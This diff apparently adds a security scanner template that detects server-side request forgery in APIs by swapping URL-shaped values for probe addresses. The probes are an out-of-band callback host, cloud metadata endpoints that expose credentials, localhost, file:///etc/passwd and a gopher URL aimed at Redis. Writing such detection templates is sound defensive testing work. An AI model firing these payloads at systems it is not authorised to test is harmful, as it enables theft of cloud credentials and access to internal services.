@@ -1,0 +1,56 @@
+id: api7-ssrf-url-param
+
+info:
+  name: API7 Server Side Request Forgery - URL-Shaped Value Injection (value-shape aware)
+  author: dast-scanner
+  severity: critical
+  description: >
+    Previously matched field NAMES (url|webhook|callback|...) — a guess list.
+    Rebuilt to match by VALUE SHAPE instead: any field whose current value
+    looks like a URL (http/https/ftp scheme) is targeted, regardless of what
+    the field is called. This is dictionary-free and catches a field like
+    "source" or "ref" holding a URL just as well as one literally named "url".
+  classification: { cwe-id: CWE-918 }
+  tags: api,owasp-api7,ssrf,dast
+
+http:
+  - fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        keys-regex: ['.*']
+        values: ['^[a-zA-Z][a-zA-Z0-9+.-]*://']
+        fuzz:
+          - 'http://{{interactsh-url}}'
+          - 'https://{{interactsh-url}}'
+          - 'http://169.254.169.254/latest/meta-data/'
+          - 'http://metadata.google.internal/computeMetadata/v1/'
+          - 'http://127.0.0.1'
+          - 'file:///etc/passwd'
+          - 'gopher://127.0.0.1:6379/_'
+      - part: body
+        type: replace
+        mode: single
+        keys-regex: ['.*']
+        values: ['^[a-zA-Z][a-zA-Z0-9+.-]*://']
+        fuzz:
+          - 'http://{{interactsh-url}}'
+          - 'https://{{interactsh-url}}'
+          - 'http://169.254.169.254/latest/meta-data/'
+          - 'http://metadata.google.internal/computeMetadata/v1/'
+          - 'http://127.0.0.1'
+          - 'file:///etc/passwd'
+          - 'gopher://127.0.0.1:6379/_'
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: ['http', 'https', 'dns']
+        condition: or
+      - type: word
+        part: body
+        words: ['ami-id', 'instance-id', 'computeMetadata', 'iam/security-credentials']
+        condition: or
+      - type: regex
+        part: body
+        regex: ['root:.*:0:0:']
